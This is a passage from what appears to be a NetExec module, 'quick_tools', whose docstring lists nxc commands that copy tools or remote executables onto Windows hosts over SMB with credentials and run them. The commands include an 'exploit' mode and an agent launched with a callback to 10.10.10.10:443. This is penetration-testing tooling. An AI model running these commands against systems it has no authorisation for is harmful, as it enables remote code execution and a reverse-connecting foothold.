...
class NXCModule:
    name = "quick_tools"
    description = "Transfers and executes utilities for usage in a new environment. Automated PingCastle executiona and report retrieval is supported"
    ...
    def options(self, context, module_options):
        ...
        nxc smb 192.168.1.1 -u {user} -p {password} -M quick_tools -o MODE=enum
        nxc smb 192.168.1.1 -u {user} -p {password} -M quick_tools -o MODE=enum DIR=C:/Windows/Temp/
        nxc smb 192.168.1.1 -u {user} -p {password} -M quick_tools -o MODE=pingcastle
        nxc smb 192.168.1.1 -u {user} -p {password} -M quick_tools -o MODE=custom CUSTOM=/path/to/tools/
        nxc smb 192.168.1.1 -u {user} -p {password} -M quick_tools -o MODE=custom CUSTOM=/path/to/agent.exe
        nxc smb 192.168.1.1 -u {user} -p {password} -M quick_tools -o MODE=custom CUSTOM=https://example.com/tool1.exe,https://example.com/tool2.exe
        nxc smb 192.168.1.1 -u {user} -p {password} -M quick_tools -o MODE=pingcastle OVERWRITE=True
        nxc smb 192.168.1.1 -u {user} -p {password} -M quick_tools -o LOCAL=False MODE=exploit
        nxc smb 192.168.1.1 -u {user} -p {password} -M quick_tools -o MODE=custom CUSTOM=/path/to/agent.exe EXEC=True ARGS='-connect 10.10.10.10:443' ( If executed program does not exit after execution, you will need to exit nxc with Ctrl+C )
        """
